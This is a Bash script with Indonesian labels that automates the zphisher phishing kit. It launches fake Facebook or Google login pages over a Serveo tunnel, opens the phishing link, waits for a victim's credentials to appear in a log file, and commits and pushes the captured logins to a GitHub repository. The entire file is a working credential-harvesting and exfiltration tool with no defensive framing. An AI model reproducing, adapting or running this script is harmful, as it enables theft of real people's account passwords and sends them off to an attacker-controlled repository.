#!/bin/bash

# === Warna ===
R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
C='\033[0;36m'
NC='\033[0m'

# === Repo GitHub Admin ===
GIT_DIR="$HOME/INTOOLS"  # Ganti ini
HASIL_LOCAL="$HOME/.zphisher/sites/facebook/log.txt"
[[ -f "$HASIL_LOCAL" ]] && rm -f "$HASIL_LOCAL"

# === Header ===
clear
echo -e "${C}╔══════════════════════╗"
echo -e "║   INTOOLS MOD MENU   ║"
echo -e "╚══════════════════════╝${NC}"

# === Menu ===
echo -e "${Y}[1] Login Facebook"
echo -e "[2] Login Google"
echo -e "[0] Keluar${NC}"
read -p "Pilih jenis login: " pil

case $pil in
  1)
    echo -e "${C}Menjalankan Facebook phishing (Serveo)...${NC}"
    echo 1 | zphisher > /dev/null 2>&1 &
    ;;
  2)
    echo -e "${C}Menjalankan Google phishing (Serveo)...${NC}"
    echo 2 | zphisher > /dev/null 2>&1 &
    ;;
  0)
    echo -e "${Y}Keluar...${NC}"; exit ;;
  *)
    echo -e "${R}Pilihan tidak valid${NC}"; exit ;;
esac

# === Tunggu Link Serveo ===
echo -e "${G}Menunggu link Serveo aktif...${NC}"
sleep 10

LINK=$(grep -o "https://[a-z0-9.-]*serveo.net" ~/.zphisher/server.log | head -n 1)

if [[ -z $LINK ]]; then
  echo -e "${R}Gagal mendapatkan link Serveo.${NC}"; exit 1
fi

# === Buka Link Otomatis ===
echo -e "${C}Link phishing: ${Y}$LINK${NC}"
termux-open-url "$LINK"
echo -e "${Y}Silakan tunggu korban login...${NC}"

# === Pantau File Hasil ===
while [[ ! -s "$HASIL_LOCAL" ]]; do
  sleep 2
done

# === Simpan & Push ke GitHub ===
echo -e "${G}Login ditemukan, menyimpan ke GitHub...${NC}"
cp "$HASIL_LOCAL" "$GIT_DIR/hasil.txt"
cd "$GIT_DIR"
git add hasil.txt
git commit -m "Update hasil login $(date +%F_%T)"
git push origin main

echo -e "${C}Hasil login berhasil dikirim ke GitHub.${NC}"
